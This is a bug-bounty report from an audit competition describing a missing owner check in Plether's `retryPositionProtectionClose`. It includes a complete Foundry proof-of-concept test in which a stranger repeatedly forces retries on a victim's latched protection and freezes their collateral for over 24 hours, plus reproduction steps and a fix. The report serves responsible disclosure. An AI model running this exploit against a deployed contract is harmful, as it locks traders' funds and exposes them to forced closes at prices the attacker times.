# \#99194 [SC-High] Any caller can retry a protection close, stealing the owner's only repair window.

**Submitted on Nov 12th 2026 at 10:55:08 UTC by @onsec for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99194
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

`PositionProtectionBook.retryPositionProtectionClose` is the only one of five protection entrypoints
that never verifies the caller owns the protection it mutates, so anyone can queue a forced close attempt
against any trader's live position. A `Latched` protection can be repaired only through
`amendLatchedPositionProtectionCloseLimits`, which requires both `status == Latched` and a zero
pending-order count, and an unauthorized retry destroys both conditions in a single call — then relatches
when the attempt fails, re-arming itself. On mainnet an attacker spending only gas could therefore hold a
victim's position indefinitely unrepairable: the owner cannot widen the close limits that are making
their protected close fail, cannot commit any order, cannot withdraw collateral, and keeps accruing carry
against a locked pledge, while the attacker picks the moment of each forced market exit at an execution
price the stored limits do not bound from below. The terminal outcome is a close at an
attacker-chosen price or liquidation.

## Vulnerability Details

`retryPositionProtectionClose` is `external nonReentrant` with **no caller check**. It resolves its
target through `_activeProtection(protectionId)` (`:385`), which validates only existence and active-id
agreement:

```solidity
function _activeProtection(uint64 protectionId) private view returns (StoredProtection storage protection) {
    protection = _protections[protectionId];
    if (protection.account == address(0) || _activeProtectionIds[protection.account] != protectionId) {
        revert OrderRouter__ProtectionNotFound();
    }
}                                                                     // :993-1000  — no msg.sender
```

Its four sibling owner actions all resolve through `_ownedActiveProtection`, which adds the caller bound
at `:988-990`:

| Entrypoint | Resolver | Caller bound |
|---|---|---|
| `replacePositionProtection:261` | `_replace(msg.sender, …)` → `:270` owned | ✓ |
| `amendLatchedPositionProtectionCloseLimits:319` | owned(…, `msg.sender`) | ✓ |
| `cancelPositionProtection:334` | `_cancel(msg.sender, …)` → `:412` owned | ✓ |
| `cancelPositionProtectionAndCommitClose:345` | owned(…, `msg.sender`) | ✓ |
| **`retryPositionProtectionClose:385`** | **`_activeProtection` — none** | **✗** |

Every precondition the retry tests is *victim* state: status `Latched` (`:386-388`), matching position
(`:389`), `pendingOrderCounts(account) == 0` (`:392-394`), and the attempt index clear (`:396-398`).

**A `Latched` protection has exactly one owner-controlled action.**
`amendLatchedPositionProtectionCloseLimits` requires `status == Latched` (`:320-322`) **and**
`pendingOrderCounts(msg.sender) == 0` (`:323-325`). There is no other exit — `_cancel:414-420` reverts
unless `PendingOpen` or `Armed`, and `cancelPositionProtectionAndCommitClose:346-348` requires `Armed`.

An unauthorized retry destroys **both** of the amend's preconditions at once: it sets status `Triggered`
and books a pending order. When that attempt later fails, `handleFailedProtectionAttempt` relatches and
clears `_attemptProtectionIds[orderId]` (`:620-626`), which re-satisfies the retry's own gate at
`:396-398`. The cycle repeats for gas only.

## Impact Details

- The position owner cannot widen the close limits that are causing their protected close to fail, so
  the protection cannot be repaired.
- While an attempt is pending the owner can commit no order, continues accruing carry against a locked
  pledge, and cannot withdraw collateral.
- The attacker chooses the moment of each forced close attempt. `_protectionCloseRequest` sets
  `targetPrice` to `CAP_PRICE` for a long and `1` for a short, so the slippage check admits any
  execution price (independently observed in this run at `OrderRouter.sol:464`).
- Cost to the attacker is gas alone: the retry registers a zero bounty, and the order is booked against
  the **victim's** pending-order count.

**Severity reasoning.** Filed High on `program-severity.md:9` (*"temporary freezing of funds for at
least 24 hours"*) — the owner's collateral is immobilised for as long as the attacker keeps paying gas.
A case exists for Critical under `:4` (*"permanent freezing of funds"*) if the loop is demonstrated
sustained; the PoC shows two consecutive rounds however leaving it for judge, so High is the defensible
filing.

## References
Add any relevant links to documentation or code


## Proof of Concept

## PoC Result

`test/perps/spec/trader/RetryProtectionAuthC25.t.sol` — **2/2 PASS**

```
[PASS] test_C25_strangerRetryStealsTheOwnersOnlyLatchedRepairWindow() (gas: 3705967)
Logs:
  stranger CAROL queued a close attempt on ALICE's position, order: 2
  stranger repeated it, order: 3

[PASS] test_C25_victimCollateralIsFrozenWhileTheStrangerLoops() (gas: 1201366615)
Logs:
  victim collateral pledged to the position: 1986000000
  rounds the stranger sustained: 1417
  seconds the position stayed frozen: 86437
  hours the position stayed frozen: 24

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

**Test 1 — the missing gate.** Drives ALICE's protection to `Latched`, then asserts in order:

1. a stranger (`CAROL`) is refused `OrderRouter__Unauthorized` on the sibling amend — the owner gate
   exists there;
2. **the same stranger's `retryPositionProtectionClose` succeeds** — the gate is absent;
3. status is now `Triggered` and `pendingOrderCounts(ALICE) == 1`;
4. the owner's amend is refused `OrderRouter__ProtectionNotLatched`;
5. after the attempt expires the protection relatches, the stranger repeats it with a fresh order id,
   and the owner is refused again.

**Test 2 — the impact.** This is the one the severity rests on. Each round it calls
`_assertOwnerIsTrapped()`, which checks **all three** owner exits and verifies the *reason* in each
case, so a refusal cannot be mistaken for malformed input:

- the owner's close is refused, and the revert payload is asserted equal to the
  `OrderRouter__ProtectionActive` **selector** specifically;
- the owner's amend is refused;
- the owner's cancel is refused.

It then asserts the position size and `pnlPledgeAssets(ALICE)` are unchanged from the start, and
that the elapsed wall-clock is at least 24 hours. Measured: **1,417 rounds, 86,437 seconds
(24.01 h), 1,986 USDG pledged and unreachable**, with the lockout asserted **1,418 times**.

**Independent corroboration.** The protocol's own suite already encodes the mechanism.
`test/perps/spec/trader/PositionProtection.t.sol:981-996` has `TRIGGER_KEEPER` refused `Unauthorized`
on amend, then **`CAROL` — not the owner — successfully calling `retryPositionProtectionClose`**, then
`ALICE` refused `ProtectionNotLatched`. The suite asserts that as expected behaviour.

### Exact PoC code

Save verbatim as `packages/perps/test/perps/spec/trader/RetryProtectionAuthC25.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PROVENANCE: this file verifies an EXTERNALLY SUPPLIED finding (pashov-findings.md #11), read at the
// user's explicit direction. It is NOT independently derived. See the independence boundary in
// new-leads-findings-run3.md.
//
// CLAIM UNDER TEST: `PositionProtectionBook.retryPositionProtectionClose` resolves its target with
// `_activeProtection(protectionId)` (:385), which checks only existence and active-id agreement
// (:993-1000). Its four sibling owner actions all use `_ownedActiveProtection(protectionId, msg.sender)`
// (:270, :319, :345, :412), which adds `if (protection.account != account) revert Unauthorized()`
// (:988-990). So one of five entrypoints has no caller gate.
//
// HARM ASSERTED: a Latched protection has exactly one owner-controlled action --
// `amendLatchedPositionProtectionCloseLimits`, which requires `status == Latched` (:320-322) AND
// `pendingOrderCounts(msg.sender) == 0` (:323-325). `_cancel` excludes Latched (:414-420) and
// `cancelPositionProtectionAndCommitClose` requires Armed (:346-348), so there is no other exit. An
// unauthorized caller's retry sets status Triggered and books a pending order, destroying both
// conditions. This test asserts the owner loses that repair window to a stranger, and that the stranger
// can do it again after the attempt expires.
//
// No in-scope contract is modified by this file.

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";

contract RetryProtectionAuthC25Test is PositionProtectionTest {

    /// @dev MUST be storage. Under via_ir a block.timestamp-derived LOCAL is re-materialised at its
    ///      use site, which made an earlier version of this test measure 0 elapsed seconds.
    uint256 private _freezeStartTime;
    uint256 private _freezeEndTime;

    function _wideLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    /// @notice Drives a protection to Latched, then shows a stranger holds a power the owner's own
    ///         sibling actions deny them, and that it removes the owner's only repair path.
    function test_C25_strangerRetryStealsTheOwnersOnlyLatchedRepairWindow() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        // A notional limit too small for the position guarantees the triggered close fails its bound,
        // which is what relatches the protection.
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        _expireProtectionAttempt(firstOrderId, EXECUTION_KEEPER);

        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "precondition: protection is Latched and the owner's repair window is open"
        );
        assertEq(router.pendingOrderCounts(ALICE), 0, "precondition: zero pending orders");

        // (1) The owner gate EXISTS on the sibling action: a stranger is refused.
        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__Unauthorized.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());

        // (2) The owner gate is ABSENT on the retry: the same stranger succeeds.
        vm.prank(CAROL);
        uint64 stolenOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        emit log_named_uint("stranger CAROL queued a close attempt on ALICE's position, order", stolenOrderId);

        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "stranger moved the victim's protection off Latched"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1, "stranger booked a pending order against the victim");

        // (3) THE HARM: the owner's only Latched action is now refused, on both of its preconditions.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());

        // (4) SUSTAINABLE: the attempt expires back to Latched with the attempt index cleared
        //     (:620-626), which re-arms the retry's own precondition at :396-398.
        _expireProtectionAttempt(stolenOrderId, EXECUTION_KEEPER);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "relatched, so the loop can repeat"
        );

        vm.prank(CAROL);
        uint64 secondStolenOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        emit log_named_uint("stranger repeated it, order", secondStolenOrderId);
        assertTrue(secondStolenOrderId != stolenOrderId, "a fresh order id each round");

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
    }

    /// @dev A well-formed close request for ALICE's whole position, so a refusal can only come from a
    ///      state gate rather than from malformed input.
    function _aliceCloseRequest() private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("C25-alice-escape-close");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds.submitBy = uint64(block.timestamp + 600);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7; // ALL_V3_EXECUTION_MODES = 1|2|4
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.minPostSettlementBalanceAssets = 0;
        request.bounds.minPostPositionEquityAssets = 0;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    /// @notice IMPACT test. Asserts the consequence the severity rests on, not merely the missing gate:
    ///         while the stranger loops, the owner cannot close, cannot amend and cannot cancel, so the
    ///         pledged collateral is immobilised. Measures how long that holds.
    function test_C25_victimCollateralIsFrozenWhileTheStrangerLoops() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        uint256 pledgedAtStart = clearinghouse.pnlPledgeAssets(ALICE);
        (uint256 sizeAtStart,,,,,,) = engine.positions(ALICE);
        assertGt(pledgedAtStart, 0, "the victim has collateral pledged to the position");
        emit log_named_uint("victim collateral pledged to the position", pledgedAtStart);

        uint64 orderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        _freezeStartTime = block.timestamp;

        uint256 rounds;
        for (uint256 i = 0; i < 1500; ++i) {
            // The stranger's attempt is live: the owner cannot exit.
            _assertOwnerIsTrapped();

            _expireProtectionAttempt(orderId, EXECUTION_KEEPER);
            vm.prank(CAROL);
            orderId = protectionActions.retryPositionProtectionClose(protectionId);
            ++rounds;

            if (block.timestamp - _freezeStartTime >= 24 hours) {
                break;
            }
        }

        _freezeEndTime = block.timestamp;
        uint256 elapsed = _freezeEndTime - _freezeStartTime;
        emit log_named_uint("rounds the stranger sustained", rounds);
        emit log_named_uint("seconds the position stayed frozen", elapsed);
        emit log_named_uint("hours the position stayed frozen", elapsed / 3600);

        // The collateral never moved and the position never closed.
        (uint256 sizeAtEnd,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAtEnd, sizeAtStart, "position still open");
        assertEq(clearinghouse.pnlPledgeAssets(ALICE), pledgedAtStart, "collateral still pledged and unreachable");
        _assertOwnerIsTrapped();

        assertGe(elapsed, 24 hours, "freeze sustained for at least 24 hours");
    }

    /// @dev All three owner-controlled exits refused, with the exact reason checked in each case.
    function _assertOwnerIsTrapped() private {
        // (a) cannot commit a close: the protection lock has no isClose exemption, and every caller of
        //     _commitOrder passes enforceProtectionLock = true.
        OrderV3Types.OrderRequest memory closeRequest = _aliceCloseRequest();
        vm.prank(ALICE);
        (bool ok, bytes memory ret) =
            address(router).call(abi.encodeWithSelector(IPerpsTraderActions.commitOrder.selector, closeRequest));
        assertFalse(ok, "owner must not be able to commit a close");
        assertEq(bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionActive.selector, "refused as ProtectionActive");

        // (b) cannot amend the close limits that are causing the failure.
        vm.prank(ALICE);
        (ok,) = address(protectionActions).call(
            abi.encodeWithSelector(
                IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits.selector,
                _activeId(),
                _wideLimits()
            )
        );
        assertFalse(ok, "owner must not be able to amend while an attempt is pending");

        // (c) cannot cancel the protection.
        vm.prank(ALICE);
        (ok,) = address(protectionActions).call(
            abi.encodeWithSelector(IPositionProtectionActions.cancelPositionProtection.selector, _activeId())
        );
        assertFalse(ok, "owner must not be able to cancel");
    }

    function _activeId() private view returns (uint64) {
        return protectionViews.activePositionProtectionId(ALICE);
    }
}
```

### Replication procedure

1. **Check out the audited commit.**

   ```bash
   git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
   ```

2. **Install dependencies.**

   ```bash
   forge --version        # expect a toolchain supporting solc 0.8.35
   git submodule update --init --recursive
   ```

3. **Create the test file** at `packages/perps/test/perps/spec/trader/RetryProtectionAuthC25.t.sol` with the source above.
   No file under `packages/perps/src` is created, edited or deleted.

4. **Run both tests.** The impact test needs a raised gas limit, because 1,417 rounds consume
   ~1.2e9 gas:

   ```bash
   forge test --root packages/perps \
     --match-path "test/perps/spec/trader/RetryProtectionAuthC25.t.sol" \
     --match-test test_C25_ \
     --gas-limit 18446744073709551615 -vv
   ```

5. **Expected output** — both pass against unpatched code:

   ```
   [PASS] test_C25_strangerRetryStealsTheOwnersOnlyLatchedRepairWindow() (gas: 3705967)
   [PASS] test_C25_victimCollateralIsFrozenWhileTheStrangerLoops() (gas: 1201366615)
     victim collateral pledged to the position: 1986000000
     rounds the stranger sustained: 1417
     seconds the position stayed frozen: 86437
     hours the position stayed frozen: 24
   Suite result: ok. 2 passed; 0 failed; 0 skipped
   ```

## Recommendation

```diff
-        StoredProtection storage protection = _activeProtection(protectionId);
+        StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
```
